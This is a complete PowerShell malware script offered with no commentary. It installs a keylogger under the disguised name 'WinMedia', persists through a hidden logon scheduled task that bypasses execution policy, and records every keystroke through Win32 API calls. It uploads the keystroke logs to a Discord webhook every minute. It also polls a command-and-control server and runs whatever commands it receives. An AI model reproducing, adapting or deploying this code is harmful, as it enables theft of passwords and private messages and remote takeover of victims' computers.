param([string]$PCName, [string]$WebhookUrl, [string]$C2Url)

$dir = "$env:LOCALAPPDATA\WinMedia"
if (!(Test-Path $dir)) { New-Item $dir -Type Directory | Out-Null }

$logFile = "$dir\data.txt"
$scriptPath = "$dir\winlog.ps1"

# The entire operational script uses literal characters to prevent variable breaking
$payloadContent = @'
param([string]$PCName, [string]$WebhookUrl, [string]$C2Url, [string]$logFile)

if (!(Test-Path $logFile)) { New-Item $logFile -Type File | Out-Null }

# Advanced Win32 Layout Compilation Engine
$Source = @'
using System;
using System.Text;
using System.Runtime.InteropServices;

public class KeyEngine {
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int v);
    [DllImport("user32.dll")] public static extern int GetKeyboardState(byte[] lpKeyState);
    [DllImport("user32.dll")] public static extern uint MapVirtualKey(uint uCode, uint uMapType);
    [DllImport("user32.dll")] public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags);
}
'@
Add-Type -TypeDefinition $Source -ErrorAction SilentlyContinue

$c2Interval = 0
$discordInterval = 0
$headers = @{ "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" }

while ($true) {
    # ================= 1. THE ADVANCED KEYLOGGER LOOP =================
    for ($i = 1; $i -le 254; $i++) {
        if ([KeyEngine]::GetAsyncKeyState($i) -eq -32767) {
            $keyText = ""
            
            # Handle special structural execution keys directly
            switch ($i) {
                8   { $keyText = " [BACKSPACE] " }
                9   { $keyText = " [TAB] " }
                13  { $keyText = "`n" }
                16  { $keyText = "" } # Ignore lone Shift alerts
                17  { $keyText = " [CTRL] " }
                18  { $keyText = " [ALT] " }
                20  { $keyText = " [CAPS] " }
                27  { $keyText = " [ESC] " }
                32  { $keyText = " " }
                46  { $keyText = " [DEL] " }
                default {
                    # Translate standard values to unicode relative to active shift/caps locks
                    $keyState = New-Object byte[] 256
                    [KeyEngine]::GetKeyboardState($keyState) | Out-Null
                    $scanCode = [KeyEngine]::MapVirtualKey($i, 0)
                    $buffer = New-Object System.Text.StringBuilder 5

                    $rc = [KeyEngine]::ToUnicode($i, $scanCode, $keyState, $buffer, $buffer.Capacity, 0)
                    if ($rc -gt 0) { $keyText = $buffer.ToString() }
                }
            }

            if ($keyText -ne "") {
                try { $keyText | Out-File $logFile -Append -NoNewline -ErrorAction SilentlyContinue } catch {}
            }
        }
    }

    # ================= 2. REMOTE COMMAND POLLING (Every 5 Seconds) =================
    if ($c2Interval -ge 500) {
        try {
            $cmdResponse = Invoke-RestMethod -Uri "${C2Url}/get_cmd?id=${PCName}" -Method Get -Headers $headers -TimeoutSec 5
            if ($cmdResponse -and $cmdResponse -ne 'wait') {
                $output = (Invoke-Expression $cmdResponse 2>&1 | Out-String)
                if (!$output) { $output = 'Command executed with no return data.' }
                Invoke-RestMethod -Uri "${C2Url}/send_res?id=${PCName}" -Method Post -Body @{ output = $output } -Headers $headers -TimeoutSec 5 | Out-Null
            }
        } catch {}
        $c2Interval = 0
    }

    # ================= 3. DISCORD EXFILTRATION (Every 60 Seconds) =================
    if ($discordInterval -ge 6000) {
        if (Test-Path $logFile) {
            if ((Get-Item $logFile).Length -gt 0) {
                try {
                    $timestamp = Get-Date -Format 'yyyy-MM-dd_HH-mm-ss'
                    $fileName = "${PCName}_${timestamp}.txt"
                    Invoke-RestMethod -Uri $WebhookUrl -Method Post -Form @{ file = Get-Item $logFile; filename = $fileName } -TimeoutSec 10 | Out-Null
                    Clear-Content $logFile -ErrorAction SilentlyContinue
                } catch {}
            }
        }
        $discordInterval = 0
    }

    Start-Sleep -m 10
    $c2Interval += 10
    $discordInterval += 10
}
'@

# Save payload cleanly to the local execution folder 
Set-Content -Path $scriptPath -Value $payloadContent -Force

# Wipe older scheduled automation structures 
schtasks /delete /tn 'WinMediaLog' /f 2>&1 | Out-Null

# Register and execute the production loop task via Task Scheduler
schtasks /create /f /tn 'WinMediaLog' /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`" -PCName `"$PCName`" -WebhookUrl `"$WebhookUrl`" -C2Url `"$C2Url`" -logFile `"$logFile`"" /sc onlogon
schtasks /run /tn 'WinMediaLog'
